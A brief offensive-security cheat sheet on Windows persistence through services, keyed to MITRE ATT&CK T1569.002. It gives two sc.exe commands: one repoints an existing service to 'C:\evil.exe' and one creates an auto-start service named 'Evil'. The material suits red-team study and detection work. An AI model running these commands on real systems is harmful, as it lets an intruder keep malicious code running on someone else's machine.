# Service Execution for Persistence

## Method 1. Changing A Binary Path of A Service

The following command changes the binary path for a target service. This command requires `Administrator` privileges.  
Replace the "Service Name" with your target service.

```powershell
sc.exe config "Service Name" binPath= "C:\evil.exe"
```

## Method 2. Creating A Malicious Service

This command creates the "Evil" service that executes the `evil.exe`. It also requires `Administrator` privileges.

```powershell
sc.exe create Evil binPath="C:\evil.exe" start= auto
```

## Resources

- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1569/002/)